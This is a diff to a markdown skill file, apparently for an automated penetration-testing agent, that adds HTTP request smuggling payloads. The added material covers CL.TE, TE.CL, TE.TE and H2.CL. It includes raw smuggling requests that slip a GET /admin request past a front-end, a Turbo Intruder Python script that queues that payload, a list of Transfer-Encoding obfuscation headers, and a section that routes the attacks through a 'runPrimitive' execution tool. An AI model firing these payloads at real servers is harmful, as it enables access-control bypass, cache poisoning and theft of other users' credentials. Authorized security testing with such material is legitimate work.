@@ -1,9 +1,10 @@
-﻿---
+---
 name: http-smuggling
 description: "HTTP Request Smuggling exploitation covering CL.TE, TE.CL, TE.TE, H2.CL, and H2.TE attack variants"
 category: specialized
 tier: powerful
-toolRefs: [httpRequest, parseResponse, measureTiming, compareResponses, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
+toolRefs: [httpRequest, parseResponse, measureTiming, compareResponses, updateGraph, writeFinding, recordEvidence, getCapturedHeaders, runPrimitive]
+primitives: [smuggling]
 triggers: ["http request smuggling", "http smuggling", "cl.te", "te.cl", "te.te", "transfer encoding", "content length", "http2 smuggling", "request splitting", "desync attack"]
 contextBoosts: [api]
 mitreAttack: ["T1190", "T1090"]
@@ -60,6 +61,16 @@ owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration"]
 
 ### Detection Payload Template
 
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+X
+```
 
 If the server processes this as two separate requests (returns content for `G` as a second request), it is vulnerable to CL.TE.
 
@@ -78,12 +89,41 @@ Content-Length tells the front-end one request size; Transfer-Encoding tells the
 
 ### Payload Construction
 
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 44
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED GET /admin HTTP/1.1
+Host: target.com
+```
 
 - Content-Length = 44 (covers everything including the smuggled GET)
 - Transfer-Encoding = chunked, terminates at `0\r\n\r\n`
 - The `SMUGGLED GET` portion becomes a new request on the back-end
 
 ### Turbo Intruder Setup
+
+```python
+def queueRequests(target, wordlist):
+    req = '''POST / HTTP/1.1
+Host: %s
+Content-Length: 44
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED GET /admin HTTP/1.1
+Host: %s
+''' % (target.host, target.host)
+    engine.queue(Request(req, target=target))
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
 
 
 ---
@@ -101,6 +141,17 @@ Reverse of CL.TE: the front-end processes Transfer-Encoding, the back-end proces
 
 ### Payload
 
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+```
 
 - TE terminates at `0\r\n\r\n`
 - CL says 3 bytes, but the actual body is much larger
@@ -124,6 +175,33 @@ The goal is to make one device see `Transfer-Encoding: chunked` while the other 
 
 ### Common Tricks
 
+```
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+```
+
+```
+Transfer-Encoding: chunked
+Transfer-Encoding:
+```
+
+```
+Transfer-Encoding : chunked
+```
+
+```
+Transfer-Encoding: chunKed
+```
+
+```
+Transfer-Encoding: chunked, identity
+```
+
+```
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+```
+
 
 ### Exploitation
 
@@ -146,6 +224,14 @@ Exploits the mismatch between HTTP/2 framing and HTTP/1.1 header parsing. HTTP/2
 
 ### Payload (via h2 or curl --http2)
 
+```
+POST / HTTP/2
+Host: target.com
+Content-Length: 5
+
+SMUGGLED GET /admin HTTP/1.1
+Host: target.com
+```
 
 - The `content-length` pseudo-header says 5 bytes
 - The DATA frame contains 50 bytes
@@ -286,3 +372,14 @@ Establish a baseline first: send a normal request and record status, headers, bo
 ## Verification & Impact
 
 CONFIRMED when a smuggled request demonstrably creates a second processed request/response (observable new status, reflected content, redirect, or 404 for a crafted path) with the exact request bytes captured via `recordEvidence`. SUSPECTED when only timing anomalies exist without a reproduced side effect — record as candidate. Document impact by the proven chain: response/header injection into other users (XSS, credential theft), cache poisoning (persistent content for all users), or internal SSRF reach. Note the specific variant (CL.TE/TE.CL/TE.TE/H2.CL/H2.TE) and the parsing discrepancy that enables it.
+
+## Primitive Execution
+
+The attack classes above are executable through the primitive registry. Invoke each
+primitive by its id below using the run-primitive execution tool instead of re-firing
+payloads manually; confirmed results pass through the evidence gate and commit as
+findings with exploit proofs automatically.
+
+| Primitive id | Coverage |
+|---|---|
+| `smuggling` | CL.TE / TE.CL request-smuggling detection |
